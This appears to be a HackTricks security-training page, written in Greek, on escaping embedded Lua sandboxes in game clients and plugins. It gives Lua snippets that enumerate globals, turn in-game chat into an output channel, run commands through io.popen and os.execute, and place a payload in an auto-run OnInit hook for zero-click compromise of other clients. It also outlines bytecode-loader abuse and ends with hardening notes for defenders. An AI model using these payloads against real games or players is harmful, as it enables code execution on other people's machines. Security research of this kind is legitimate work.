# Παρακάμψτε Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

Αυτή η σελίδα συγκεντρώνει πρακτικές τεχνικές για να εξερευνήσετε και να ξεφύγετε από ενσωματωμένα Lua "sandboxes" σε εφαρμογές (ιδιαίτερα game clients, plugins, ή in-app scripting engines). Πολλές engines εκθέτουν ένα περιορισμένο περιβάλλον Lua, αλλά αφήνουν ισχυρά globals προσβάσιμα που επιτρέπουν αυθαίρετη εκτέλεση εντολών ή ακόμη και native memory corruption όταν εκτίθενται bytecode loaders.

Key ideas:
- Θεωρήστε το VM ως άγνωστο περιβάλλον: καταγράψτε το _G και ανακαλύψτε ποια επικίνδυνα primitives είναι προσβάσιμα.
- Όταν stdout/print είναι μπλοκαρισμένο, κακοποιήστε οποιοδήποτε in-VM UI/IPC κανάλι ως output sink για να παρατηρήσετε αποτελέσματα.
- Αν io/os είναι εκτεθειμένα, συχνά έχετε απευθείας εκτέλεση εντολών (io.popen, os.execute).
- Αν load/loadstring/loadfile είναι εκτεθειμένα, η εκτέλεση crafted Lua bytecode μπορεί να υπονομεύσει την ασφάλεια μνήμης σε μερικές εκδόσεις (≤5.1 verifiers are bypassable; 5.2 removed verifier), επιτρέποντας προχωρημένη εκμετάλλευση.

## Εξερεύνηση του sandboxed περιβάλλοντος

- Dump το global environment για να καταγράψετε reachable tables/functions:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Αν το print() δεν είναι διαθέσιμο, επαναχρησιμοποιήστε τα in-VM κανάλια. Παράδειγμα από ένα MMO housing script VM όπου η έξοδος στο chat λειτουργεί μόνο μετά από μια sound call; το παρακάτω δημιουργεί μια αξιόπιστη συνάρτηση εξόδου:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Γενικεύστε αυτό το μοτίβο για τον στόχο σας: οποιοδήποτε textbox, toast, logger ή UI callback που δέχεται strings μπορεί να λειτουργήσει ως stdout για reconnaissance.

## Άμεση εκτέλεση εντολών αν io/os είναι εκτεθειμένα

Αν το sandbox εξακολουθεί να εκθέει τις standard βιβλιοθήκες io or os, πιθανότατα έχετε άμεση εκτέλεση εντολών:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Σημειώσεις:
- Η εκτέλεση συμβαίνει μέσα στο client process· πολλά anti-cheat/antidebug layers που μπλοκάρουν external debuggers δεν θα αποτρέψουν το in-VM process creation.
- Επίσης έλεγξε: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), and the debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

Αν η host application ωθεί scripts στους clients και η VM εκθέτει auto-run hooks (π.χ. OnInit/OnLoad/OnEnter), τοποθέτησε το payload σου εκεί για drive-by compromise μόλις το script φορτωθεί:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Οποιοσδήποτε ισοδύναμος callback (OnLoad, OnEnter, etc.) γενικεύει αυτή την τεχνική όταν scripts μεταδίδονται και εκτελούνται αυτόματα στον client.

## Επικίνδυνα primitives για να εντοπίσετε κατά το recon

Κατά την enumeration του _G, ψάξτε ειδικά για:
- io, os: io.popen, os.execute, file I/O, πρόσβαση σε μεταβλητές περιβάλλοντος.
- load, loadstring, loadfile, dofile: εκτελούν πηγαίο κώδικα ή bytecode· επιτρέπουν τη φόρτωση μη αξιόπιστου bytecode.
- package, package.loadlib, require: φόρτωση δυναμικών βιβλιοθηκών και επιφάνεια module.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, και hooks.
- LuaJIT-only: ffi.cdef, ffi.load για να καλεί άμεσα native code.

Minimal usage examples (if reachable):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Προαιρετική κλιμάκωση: κατάχρηση των Lua bytecode loaders

Όταν τα load/loadstring/loadfile είναι προσβάσιμα αλλά io/os είναι περιορισμένα, η εκτέλεση χειροποίητου Lua bytecode μπορεί να οδηγήσει σε memory disclosure και primitives καταστροφής μνήμης. Βασικά σημεία:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

Αυτή η διαδρομή είναι engine/version-specific και απαιτεί RE. Δείτε τις αναφορές για deep dives, exploitation primitives, και παραδείγματα gadgetry σε παιχνίδια.

## Detection and hardening notes (for defenders)

- Server side: απορρίψτε ή επαναγράψτε user scripts; allowlist safe APIs; strip ή bind-empty io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
- Client side: τρέξτε Lua με ένα minimal _ENV, απαγορεύστε bytecode loading, επανεισάγετε έναν αυστηρό bytecode verifier ή signature checks, και μπλοκάρετε τη δημιουργία διαδικασιών από τη διεργασία του client.
- Telemetry: ειδοποιήστε για gameclient → child process creation σύντομα μετά το script load; συσχετίστε με UI/chat/script events.

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
